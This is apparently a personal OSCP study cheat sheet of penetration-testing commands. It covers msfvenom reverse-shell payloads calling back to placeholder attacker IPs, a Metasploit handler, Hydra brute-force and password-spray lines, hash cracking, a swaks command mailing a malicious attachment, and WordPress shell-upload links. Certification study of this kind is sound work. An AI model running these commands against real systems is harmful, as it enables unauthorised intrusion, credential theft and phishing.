Tags: [[OSCP]]

---
# Setup
Create directories: `mkdir dc host1 host2`
- Create sub directories: `mkdir enu loot files exploits`
Setup hostnames: `sudo nano /etc/hosts` then add host/kali IPs
# Quick Reference
- `sudo nmap -T5 -p- -v host1 -oN enu/host1.nmap`
- `sudo nmap -T5 -p80,443,1978-1980 -sCV -v host1 -oN enu/nmap-services.nmap`
- `gobuster dir -u http://host1 -w /usr/share/dirb/wordlists/common.txt | tee gobuster-p80.nmap`
- `usr/share/wordlists/rockyou.txt`
- `usr/share/wordlists/SecLists`
- `nc -nvlp 4444` [NetCat Cheat Sheet](https://gist.github.com/cmbaughman/c91f41ba7b2cf71106f1)
- https://www.revshells.com/
# Exploits
- Searchspolit
	- Search exploits `searchsploit remote mouse 3.008`
	- View exploit `searchsploit -x 46697`
	- Copy exploit `searchsploit -m 46697`
- [Sicat](https://github.com/justakazh/sicat) (`~/Tools/sicat`)
	- Search exploits: `python3 ~/Tools/sicat/sicat.py -k "Keywords here" --exploitdb --msfmodule --packetstorm --exploitalert --nvd`
	- Use exported nmap xml (use `-oX nmap_out.xml`): `python3 ~/Tools/sicat/sicat.py -nm nmap_out.xml --exploitdb --msfmodule --packetstorm --exploitalert --nvd` 
- Nmap 
	- Grep Exploit list `grep Exploits /usr/share/nmap/scripts/*.nse`
	- NSE help `nmap --script-help=nsescript-name.nse`
- MSFvenom - [Cheatsheet](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/ )
	- PHP `msfvenom -p php/reverse_php LHOST=192.168.x.x LPORT=4444 -o shell.php`
	- Windows 
		- List x64 payloads: `msfvenom -l payloads --platform windows --arch x64`
		- Unstaged Revshell: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.xx.xxx LPORT=4444 -f exe > reverse.exe
		- Metasploit staged: `msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o staged.exe`
			- Open msfconsole on Kali: `sudo msfconsole -q`
			- Multi-handler: `use multi/handler`
			- Set payload: `set payload windows/x64/shell/reverse_tcp`
			- Set options: `show options`
			- Run: `run` to listen, then run binary on target (`.\staged.exe`)
	- [Alphanumeric Shellcode](https://www.offsec.com/metasploit-unleashed/alphanumeric-shellcode/) `msfvenom -a x86 --platform windows -p windows/shell/shell_reverse_tcp -e x86/alpha_mixed -f python`
# Grep
- `grep "text string" filetosearch.txt -A 5`
- `grep -rni "text string" /path/to/directory`
# Nmap
[Top 10 Scripts](https://www.stationx.net/nmap-scripts/)
- `sudo nmap -p- -T5 -o target.nmap 192.168. -v`
- `sudo nmap -Pn -p22,25,80 -sCV 192.168. -oN target.nmap -v`
- `sudo nmap -Pn -p21,242,3145,3389 -sCV 192.168.171.46 -oN authby-tcp.nmap -v --script=vulners --script-args mincvss=9.8`
# Fuzzing
Gobuster
- Directory search: `gobuster dir -u http://target.ip.address.here:port -w //usr/share/dirb/wordlists/common.txt`
- Find files: `gobuster dir -u http://www.targetwebsite.com/ -w /usr/share/dirb/wordlists/big.txt -x php,html,htm`
	- Other wordlists: `common.txt`
FFUF
- Directory search: `ffuf -u http://192.168.x.x:80/FUZZ -w /usr/share/wordlists/secLists/Discovery/Web-content/raft-medium-directories.txt -o ffuf_port`
# Hydra
- [Cheatsheet](https://github.com/frizb/Hydra-Cheatsheet)
- FTP Default Creds: `hydra -C /usr/share/secLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.x.x`
- HTTP Login: `hydra -L /usr/share/secLists/usernames/top-usernames-shortlist.txt -P /usr/share/dirb/wordlists/others/best1050.txt 192.168.x.x http-get /`
- SSH with known user: `sudo hydra -l username -P ~/Downloads/rockyou.txt -s PORT ssh://192.168.xx.xxx`
- Password Spray RDP: `sudo hydra -L ~/Downloads/rockyou.txt -p "sUp3rs3cur3p@ssw0rd rdp://192.168.xx.xxx`
- HTTP POST Login Form:
	- Use burp to intercept a failed login attempt
	- Copy line from POST request with username/password
	- Run Hydra with failed login: `hydra -l user -P ~/Downloads/rockyou.txt 192.168.target.ip http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"`
# Cracking
- John
`john user.hash --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules`
- SSH2John: `wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py
	-  `ssh2john id_rsa > ssh.hash` (`nano` to remove usernames from start of `ssh.hash`)
	- `ssh -i root_rsa root@127.0.0.1 -o IdentitiesOnly=yes`

- Hashcat - https://github.com/frizb/Hashcat-Cheatsheet
	- (MD5): `hashcat -m 0 user.hash /usr/share/wordlists/rockyou.txt -r password.rule --force`
	- HashID: `hashcat --help | grep -i "Hashname"`
		- `hash-identifier` or `hashid hashhere`
	- Find mode: `hashcat --help | grep -i "ntlm"`
	- Password Rules: `ls -la /usr/share/hashcat/rules/`[Special Rules](https://github.com/Unic0rn28/hashcat-rules)
## Email - swaks 
Sending Emails with attachments to server req. authentication
`sudo swaks -t target.user@target.com --from test@target.com -ap --attach @config.Library-ms --server target.mail.server.ip --body @emailbody.txt --header "Subject: " --suppress-data --auth-user test@target.com --auth-password knownpassword`
## Web
- Banner Grabbing: `curl -IL http://weboripaddress` & Ctrl+U to view page source
- `whatweb 192.168.xx.xxx`
- [Wordpresscan](https://github.com/swisskyrepo/Wordpresscan)
- `wpscan --url http://192.168.xx.xxx --enumerate p --plugins-detection aggressive -o target/wpswcan`
- Wordpress RCE https://medium.com/@althubianymalek/uploading-a-shell-in-wordpress-via-sqli-entry-point-1caf441b3d9a


